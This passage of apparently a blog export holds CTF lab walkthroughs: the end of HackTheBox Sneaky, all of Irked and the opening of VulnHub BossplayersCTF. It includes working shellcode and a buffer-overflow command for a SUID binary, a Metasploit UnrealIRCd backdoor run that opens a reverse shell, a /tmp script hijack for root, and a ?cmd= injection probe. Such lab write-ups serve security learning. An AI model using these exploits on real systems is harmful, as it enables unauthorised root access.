https:&#x2F;&#x2F;help.ubuntu.com&#x2F;</span><br><span class="line"></span><br><span class="line">  System information as of Fri Mar 20 08:31:46 EET 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Processes:           160</span><br><span class="line">  Usage of &#x2F;:   9.9% of 18.58GB   Users logged in:     0</span><br><span class="line">  Memory usage: 10%               IP address for eth0: 10.10.10.20</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line">  Graph this data and manage this system at:</span><br><span class="line">    https:&#x2F;&#x2F;landscape.canonical.com&#x2F;</span><br><span class="line"></span><br><span class="line">Your Hardware Enablement Stack (HWE) is supported until April 2019.</span><br><span class="line">Last login: Fri Mar 20 08:31:47 2020 from dead:beef:4::1057</span><br><span class="line">thrasivoulos@Sneaky:~$ ls</span><br><span class="line">user.txt</span><br></pre></td></tr></table></figure>
<p>æ£€æŸ¥suidæ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">thrasivoulos@Sneaky:~$ find &#x2F; -perm -4000 -user root -exec ls -ld &#123;&#125; \; 2&gt;&#x2F;dev&#x2F;null;</span><br><span class="line">-rwsr-xr-x 1 root root 67704 Nov 24  2016 &#x2F;bin&#x2F;umount</span><br><span class="line">-rwsr-xr-x 1 root root 35300 May  4  2017 &#x2F;bin&#x2F;su</span><br><span class="line">-rwsr-xr-x 1 root root 88752 Nov 24  2016 &#x2F;bin&#x2F;mount</span><br><span class="line">-rwsr-xr-x 1 root root 43316 May  8  2014 &#x2F;bin&#x2F;ping6</span><br><span class="line">-rwsr-xr-x 1 root root 30112 May 15  2015 &#x2F;bin&#x2F;fusermount</span><br><span class="line">-rwsr-xr-x 1 root root 38932 May  8  2014 &#x2F;bin&#x2F;ping</span><br><span class="line">-rwsrwsr-x 1 root root 7301 May  4  2017 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;chal</span><br><span class="line">-rwsr-xr-- 1 root dip 323000 Apr 21  2015 &#x2F;usr&#x2F;sbin&#x2F;pppd</span><br><span class="line">-rwsr-xr-x 1 root root 18168 Nov 24  2015 &#x2F;usr&#x2F;bin&#x2F;pkexec</span><br><span class="line">-rwsr-xr-x 1 root root 18136 May  8  2014 &#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils</span><br><span class="line">-rwsr-xr-x 1 root root 35916 May  4  2017 &#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">-rwsr-xr-x 1 root root 66284 May  4  2017 &#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 45420 May  4  2017 &#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">-rwsr-xr-x 1 root root 72860 Oct 21  2013 &#x2F;usr&#x2F;bin&#x2F;mtr</span><br><span class="line">-rwsr-xr-x 1 root root 30984 May  4  2017 &#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 156708 Oct 14  2016 &#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">-rwsr-xr-x 1 root root 44620 May  4  2017 &#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">-rwsr-xr-- 1 root messagebus 333952 Dec  7  2016 &#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 492972 Aug 11  2016 &#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 9808 Nov 24  2015 &#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1</span><br><span class="line">-rwsr-xr-x 1 root root 5480 Mar 27  2017 &#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br></pre></td></tr></table></figure>
<blockquote>
<p>å‘½ä»¤è§£é‡Šï¼š</p>
<p>-perm -4000 åˆ—å‡ºæ‹¥æœ‰setuidå±æ€§çš„æ–‡ä»¶å’Œç›®å½•</p>
<p>-user root æ–‡ä»¶æˆ–ç›®å½•æ‰€æœ‰è€…å±äºroot</p>
<p>-exec ls -ld {} \ å¯¹ä¹‹å‰åˆ—å‡ºçš„æ–‡ä»¶ç›®å½•å†æ‰§è¡Œ<code>ls -ld</code>å‘½ä»¤</p>
<p>2&gt;/dev/null å°†æ ‡å‡†é”™è¯¯è¾“å‡ºstderråˆ æ‰</p>
</blockquote>
<p>æŸ¥çœ‹<code>/usr/local/bin/chal</code>æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">thrasivoulos@Sneaky:~$ file &#x2F;usr&#x2F;local&#x2F;bin&#x2F;chal</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;chal: setuid, setgid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU&#x2F;Linux 2.6.24, BuildID[sha1]&#x3D;fc8ad06fcfafe1fbc2dbaa1a65222d685b047b11, not stripped</span><br></pre></td></tr></table></figure>
<p>å¥½äº†ï¼Œä»è¿™é‡Œå¼€å§‹å°±åˆ°äº†æˆ‘çš„çŸ¥è¯†ç›²åŒºäº†ï¼Œæ¶‰åŠåˆ°æ ˆæº¢å‡ºæ¼æ´çš„åˆ©ç”¨ï¼Œåªèƒ½è·Ÿç€å¤§ä½¬ä¸€æ­¥ä¸€æ­¥çš„æ¥ã€‚</p>
<p>Shellcodeï¼š<a href="http://shell-storm.org/shellcode/files/shellcode-811.php">http://shell-storm.org/shellcode/files/shellcode-811.php</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">thrasivoulos@Sneaky:&#x2F;usr&#x2F;local&#x2F;bin$ .&#x2F;chal $(python -c &#39;print &quot;\x90&quot;*330 +&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&quot; + &quot;\x42\xf4\xff\xbf&quot;*30&#39;)</span><br><span class="line"># id</span><br><span class="line">uid&#x3D;1000(thrasivoulos) gid&#x3D;1000(thrasivoulos) euid&#x3D;0(root) egid&#x3D;0(root) groups&#x3D;0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(thrasivoulos)</span><br><span class="line"># cat &#x2F;root&#x2F;root.txt</span><br><span class="line">c515[----------------------------]fb33</span><br></pre></td></tr></table></figure>
<h2 id="0x05-Summary">0x05 Summary</h2>
<p>Sneakyæ˜¯ä¸€ä¸ª2017å¹´çš„é¶æœºï¼Œè¯„åˆ†5åˆ†ï¼Œä¸å¾—ä¸è¯´è´¨é‡éå¸¸é«˜ã€‚æ‰«æå¸¸è§„çš„TCPç«¯å£å’Œç½‘ç«™è·¯å¾„åï¼Œç”¨åŸºæœ¬çš„SQLæ³¨å…¥æ‹¿åˆ°ç”¨æˆ·åå’ŒSSH keyï¼Œä½†æ˜¯ç°åœ¨é‡åˆ°äº†æ²¡æœ‰å¼€æ”¾22ç«¯å£çš„é—®é¢˜ï¼Œç´§æ¥ç€å»æ‰«æUDPç«¯å£ï¼Œå‘ç°è¿è¡Œäº†SNMPæœåŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨snmpwalkå·¥å…·é€šè¿‡GETNEXTè¯·æ±‚æŸ¥è¯¢æŒ‡å®šOIDå…¥å£çš„æ‰€æœ‰OIDæ ‘ä¿¡æ¯ï¼Œç”±æ­¤è·å¾—äº†é¶æœºäº†IPv6çš„åœ°å€ï¼Œnmapæ‰«æåå‘ç°å¼€æ”¾äº†SSH 22ç«¯å£ã€‚ä½†æ˜¯ææƒrootç”¨åˆ°äº†æ ˆæº¢å‡ºçš„çŸ¥è¯†ç‚¹ï¼Œç¡®å®æ²¡ä»€ä¹ˆåŸºç¡€ï¼Œçœ‹èµ·æ¥æœ‰ç‚¹åƒåŠ›ï¼Œå…ˆmarkï¼Œä¸‹æ¬¡æœ‰æ—¶é—´å†ç ”ç©¶ä¸€ä¸‹ã€‚</p>
<h2 id="0x06-Reference">0x06 Reference</h2>
<p><a href="https://www.youtube.com/watch?v=1UGxjqTnuyo&amp;feature=youtu.be">https://www.youtube.com/watch?v=1UGxjqTnuyo&amp;feature=youtu.be</a></p>
<p><a href="https://s1gh.sh/hackthebox-sneaky-walkthrough/">https://s1gh.sh/hackthebox-sneaky-walkthrough/</a></p>
<p><a href="https://hkh4cks.com/blog/2017/12/30/htb-sneaky-walkthrough/">https://hkh4cks.com/blog/2017/12/30/htb-sneaky-walkthrough/</a></p>
<p><a href="https://www.hackingarticles.in/hack-the-box-challenge-sneaky-walkthrough/">https://www.hackingarticles.in/hack-the-box-challenge-sneaky-walkthrough/</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Irked Walkthrough</title>
    <url>/Target_drone/HackTheBox/9.HTB-Irked-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Irked-Walkthrough">HTB::Irked Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200323143336.png" alt=""></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>steghide</li>
<li>metaspolit</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<h3 id="Initial-Enumeration">Initial Enumeration</h3>
<p><strong>nmap scan ports</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nmap -sC -sV -p- 10.10.10.117 </span><br><span class="line">Nmap scan report for 10.10.10.117</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 65528 filtered ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)</span><br><span class="line">|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)</span><br><span class="line">|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)</span><br><span class="line">|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)</span><br><span class="line">80&#x2F;tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.10 (Debian)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">111&#x2F;tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port&#x2F;proto  service</span><br><span class="line">|   100000  2,3,4        111&#x2F;tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111&#x2F;udp   rpcbind</span><br><span class="line">|   100000  3,4          111&#x2F;tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111&#x2F;udp6  rpcbind</span><br><span class="line">|   100024  1          39065&#x2F;tcp6  status</span><br><span class="line">|   100024  1          47673&#x2F;udp   status</span><br><span class="line">|   100024  1          49431&#x2F;tcp   status</span><br><span class="line">|_  100024  1          56811&#x2F;udp6  status</span><br><span class="line">6697&#x2F;tcp  open  irc     UnrealIRCd</span><br><span class="line">8067&#x2F;tcp  open  irc     UnrealIRCd</span><br><span class="line">49431&#x2F;tcp open  status  1 (RPC #100024)</span><br><span class="line">65534&#x2F;tcp open  irc     UnrealIRCd</span><br><span class="line">Service Info: Host: irked.htb; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1762.08 seconds</span><br></pre></td></tr></table></figure>
<p><strong>website home page</strong></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200323161109.png" alt=""></p>
<h3 id="Getting-User-Access">Getting User Access</h3>
<p><strong>search UnrealIRCd through msf</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 &gt; search UnrealIRCd</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   #  Name                                        Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                        ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit&#x2F;unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution</span><br><span class="line">   msf5 &gt; use exploit&#x2F;unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor</span><br><span class="line">msf5 exploit(unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span><br><span class="line">   RPORT   6667             yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br><span class="line"></span><br><span class="line">msf5 exploit(unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor) &gt; set RHOSTS 10.10.10.117</span><br><span class="line">RHOSTS &#x3D;&gt; 10.10.10.117</span><br><span class="line">msf5 exploit(unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor) &gt; set RPORT 6697</span><br><span class="line">RPORT &#x3D;&gt; 6697</span><br><span class="line">msf5 exploit(unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor) &gt; exploit                                               </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 10.10.16.99:4444 </span><br><span class="line">[*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697...</span><br><span class="line">    :irked.htb NOTICE AUTH :*** Looking up your hostname...</span><br><span class="line">[*] 10.10.10.117:6697 - Sending backdoor command...</span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Command: echo XSY6AWtTV0SElhyO;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket A</span><br><span class="line">[*] A: &quot;XSY6AWtTV0SElhyO\r\n&quot;</span><br><span class="line">[*] Matching...</span><br><span class="line">[*] B is input...</span><br><span class="line">[*] Command shell session 1 opened (10.10.16.99:4444 -&gt; 10.10.10.117:36674) at 2020-03-23 04:21:50 -0400 </span><br></pre></td></tr></table></figure>
<p><strong>python tty shell</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">ircd@irked:~&#x2F;Unreal3.2$ id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;1001(ircd) gid&#x3D;1001(ircd) groups&#x3D;1001(ircd)</span><br><span class="line">ircd@irked:~$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x  3 ircd root 4096 May 15  2018 .</span><br><span class="line">drwxr-xr-x  4 root root 4096 May 14  2018 ..</span><br><span class="line">-rw-------  1 ircd ircd  333 May 15  2018 .bash_history</span><br><span class="line">-rw-r--r--  1 ircd ircd    0 May 14  2018 .bashrc</span><br><span class="line">-rw-r--r--  1 ircd ircd   66 May 14  2018 .selected_editor</span><br><span class="line">drwx------ 13 ircd ircd 4096 Mar 22 18:37 Unreal3.2</span><br></pre></td></tr></table></figure>
<p><strong>exeamine histroy command</strong> <code>.bash_history</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ircd@irked:~$ cat .bash_history</span><br><span class="line">cat .bash_history</span><br><span class="line">ls</span><br><span class="line">cat aliases</span><br><span class="line">ls keys</span><br><span class="line">ls keys</span><br><span class="line">ls keys&#x2F;CVS</span><br><span class="line">cd keys</span><br><span class="line">ls</span><br><span class="line">file CVS</span><br><span class="line">cd CVS</span><br><span class="line">ls</span><br><span class="line">ls Root</span><br><span class="line">cat Root&#x2F;Root</span><br><span class="line">cd Root</span><br><span class="line">ls</span><br><span class="line">file Root</span><br><span class="line">cat Root</span><br><span class="line">cd &#x2F;</span><br><span class="line">ls</span><br><span class="line">cd &#x2F;home</span><br><span class="line">ls</span><br><span class="line">cd djmardov</span><br><span class="line">ls</span><br><span class="line">ls *</span><br><span class="line">cd &#x2F;tmp</span><br><span class="line">ls</span><br><span class="line">clear</span><br><span class="line">clear</span><br><span class="line">ls</span><br><span class="line">cd &#x2F;</span><br><span class="line">ls</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">ls</span><br><span class="line">cd &#x2F;tmp</span><br><span class="line">sudo -i</span><br><span class="line">cd &#x2F;home&#x2F;ircd</span><br><span class="line">clear</span><br><span class="line">ls</span><br><span class="line">ls -lah</span><br><span class="line">cd ..</span><br><span class="line">ls</span><br><span class="line">cd djmardov</span><br><span class="line">ls</span><br><span class="line">cd Documents</span><br><span class="line">ls -lah</span><br><span class="line">cat .backup</span><br><span class="line">clear</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
<p><strong>Sensitive file</strong> <code>/home/djmardov/Documents/.backup</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ircd@irked:&#x2F;home&#x2F;djmardov&#x2F;Documents$ cat .backup</span><br><span class="line">cat .backup</span><br><span class="line">Super elite steg backup pw</span><br><span class="line">UPupDOWNdownLRlrBAbaSSss</span><br></pre></td></tr></table></figure>
<p><strong>Down the image</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ wget http:&#x2F;&#x2F;10.10.10.117&#x2F;irked.jpg</span><br></pre></td></tr></table></figure>
<p><strong>steghide extract file from the image</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ steghide extract -sf irked.jpg</span><br><span class="line">Enter passphrase: </span><br><span class="line">wrote extracted data to &quot;pass.txt&quot;.</span><br><span class="line">$ cat pass.txt</span><br><span class="line">Kab6h+m+bbp2J:HG</span><br></pre></td></tr></table></figure>
<p><strong>SSH port 22</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh djmardov@10.10.10.117</span><br><span class="line">The authenticity of host &#39;10.10.10.117 (10.10.10.117)&#39; can&#39;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:kunqU6QEf9TV3pbsZKznVcntLklRwiVobFZiJguYs4g.</span><br><span class="line">Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#39;10.10.10.117&#39; (ECDSA) to the list of known hosts.</span><br><span class="line">djmardov@10.10.10.117&#39;s password: </span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU&#x2F;Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Tue May 15 08:56:32 2018 from 10.33.3.3</span><br><span class="line">djmardov@irked:~$ id</span><br><span class="line">uid&#x3D;1000(djmardov) gid&#x3D;1000(djmardov) groups&#x3D;1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)</span><br><span class="line">djmardov@irked:~$ cat ~&#x2F;Documents&#x2F;user.txt </span><br><span class="line">4a66a78b12dc0e661a59d3f5c0267a8e</span><br></pre></td></tr></table></figure>
<h3 id="Getting-Root-Access">Getting Root Access</h3>
<p><strong>Find SUID directory</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">djmardov@irked:~$ find &#x2F; -perm -4000 -user root -exec ls -ld &#123;&#125; \; 2&gt;&#x2F;dev&#x2F;null;</span><br><span class="line">-rwsr-xr-- 1 root messagebus 362672 Nov 21  2016 &#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 9468 Mar 28  2017 &#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">-rwsr-xr-x 1 root root 13816 Sep  8  2016 &#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1</span><br><span class="line">-rwsr-xr-x 1 root root 562536 Nov 19  2017 &#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 13564 Oct 14  2014 &#x2F;usr&#x2F;lib&#x2F;spice-gtk&#x2F;spice-client-glib-usb-acl-helper</span><br><span class="line">-rwsr-xr-x 1 root root 1085300 Feb 10  2018 &#x2F;usr&#x2F;sbin&#x2F;exim4</span><br><span class="line">-rwsr-xr-- 1 root dip 338948 Apr 14  2015 &#x2F;usr&#x2F;sbin&#x2F;pppd</span><br><span class="line">-rwsr-xr-x 1 root root 43576 May 17  2017 &#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">-rwsr-sr-x 1 root mail 96192 Nov 18  2017 &#x2F;usr&#x2F;bin&#x2F;procmail</span><br><span class="line">-rwsr-xr-x 1 root root 78072 May 17  2017 &#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 38740 May 17  2017 &#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 18072 Sep  8  2016 &#x2F;usr&#x2F;bin&#x2F;pkexec</span><br><span class="line">-rwsr-sr-x 1 root root 9468 Apr  1  2014 &#x2F;usr&#x2F;bin&#x2F;X</span><br><span class="line">-rwsr-xr-x 1 root root 53112 May 17  2017 &#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">-rwsr-xr-x 1 root root 52344 May 17  2017 &#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">-rwsr-xr-x 1 root root 7328 May 16  2018 &#x2F;usr&#x2F;bin&#x2F;viewuser</span><br><span class="line">-rwsr-xr-x 1 root root 96760 Aug 13  2014 &#x2F;sbin&#x2F;mount.nfs</span><br><span class="line">-rwsr-xr-x 1 root root 38868 May 17  2017 &#x2F;bin&#x2F;su</span><br><span class="line">-rwsr-xr-x 1 root root 34684 Mar 29  2015 &#x2F;bin&#x2F;mount</span><br><span class="line">-rwsr-xr-x 1 root root 34208 Jan 21  2016 &#x2F;bin&#x2F;fusermount</span><br><span class="line">-rwsr-xr-x 1 root root 161584 Jan 28  2017 &#x2F;bin&#x2F;ntfs-3g</span><br><span class="line">-rwsr-xr-x 1 root root 26344 Mar 29  2015 &#x2F;bin&#x2F;umount</span><br></pre></td></tr></table></figure>
<p>Inspect the viewuser binary</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">djmardov@irked:~$ &#x2F;usr&#x2F;bin&#x2F;viewuser</span><br><span class="line">This application is being devleoped to set and test user permissions</span><br><span class="line">It is still being actively developed</span><br><span class="line">(unknown) :0           2020-03-22 18:37 (:0)</span><br><span class="line">djmardov pts&#x2F;1        2020-03-23 09:52 (10.10.16.99)</span><br><span class="line">sh: 1: &#x2F;tmp&#x2F;listusers: not found</span><br></pre></td></tr></table></figure>
<p>viewuserä¼¼ä¹å°è¯•æ‰§è¡Œ<code>/tmp</code>ä¸­åä¸º<code>listuser</code>çš„ä¸å­˜åœ¨çš„è„šæœ¬ï¼Œå‘è„šæœ¬ä¸­å†™å…¥bashå‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">djmardov@irked:&#x2F;tmp$ touch listusers</span><br><span class="line">djmardov@irked:&#x2F;tmp$ echo &#39;#!&#x2F;bin&#x2F;bash&#39; &gt;&gt; listusers </span><br><span class="line">djmardov@irked:&#x2F;tmp$ echo &#39;&#x2F;bin&#x2F;sh&#39; &gt;&gt; listusers </span><br><span class="line">djmardov@irked:&#x2F;tmp$ &#x2F;usr&#x2F;bin&#x2F;viewuser </span><br><span class="line">This application is being devleoped to set and test user permissions</span><br><span class="line">It is still being actively developed</span><br><span class="line">(unknown) :0           2020-03-22 18:37 (:0)</span><br><span class="line">djmardov pts&#x2F;1        2020-03-23 09:52 (10.10.16.99)</span><br><span class="line">sh: 1: &#x2F;tmp&#x2F;listusers: Permission denied</span><br><span class="line">djmardov@irked:&#x2F;tmp$ chmod 777 listusers </span><br><span class="line">djmardov@irked:&#x2F;tmp$ &#x2F;usr&#x2F;bin&#x2F;viewuser </span><br><span class="line">This application is being devleoped to set and test user permissions</span><br><span class="line">It is still being actively developed</span><br><span class="line">(unknown) :0           2020-03-22 18:37 (:0)</span><br><span class="line">djmardov pts&#x2F;1        2020-03-23 09:52 (10.10.16.99)</span><br><span class="line"># id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;1000(djmardov) groups&#x3D;1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Conclusion">0x04 Conclusion</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/irked.jpg" alt=""></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub::BossplayersCTF-walkthrough</title>
    <url>/Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough/</url>
    <content><![CDATA[<h1 id="VulnHub-BossplayersCTF-Walkthrough">VulnHub::BossplayersCTF Walkthrough</h1>
<h2 id="0x01-Introduction">0x01 Introduction</h2>
<p>Aimed at Beginner Security Professionals who want to get their feet wet into doing some CTFâ€™s. It should take around 30 minutes to root.</p>
<p>FROM: <a href="https://www.vulnhub.com/entry/bossplayersctf-1,375/">https://www.vulnhub.com/entry/bossplayersctf-1,375/</a></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>netdiscover</li>
<li>nmap</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<p>netdiscoveræ‰«æå†…ç½‘æ®µï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215121221.png" alt=""></p>
<p>é¶æœºIPåœ°å€192.168.0.104ï¼ŒnmapæŸ¥çœ‹å¼€æ”¾ç«¯å£ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215121423.png" alt=""></p>
<p>80ç«¯å£ä¸Šè¿è¡Œç€Apache2.3.48ï¼Œdirsearchå’Œgobusteræ‰«æç½‘ç«™ç›®å½•ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215122359.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215151339.png" alt=""></p>
<p>logs.phpå’Œrobots.txtéƒ½æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ï¼Œindex.htmlæŸ¥çœ‹æºä»£ç ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215151531.png" alt=""></p>
<p>ä¸‰æ¬¡base64è§£ç å¾—åˆ°ä¸€ä¸ªåå°ç½‘é¡µï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215151722.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215151816.png" alt=""></p>
<p>æç¤ºæˆ‘ä»¬å¯èƒ½å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œå°è¯•ä¸€ä¸‹<code>?cmd=pwd</code>ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215151935.png" alt=""></p>
<p>æˆåŠŸå¾—åˆ°å›æ˜¾ï¼Œå†åå¼¹shellï¼Œæœ¬åœ°ç›‘å¬4444ç«¯å£ï¼š</p>
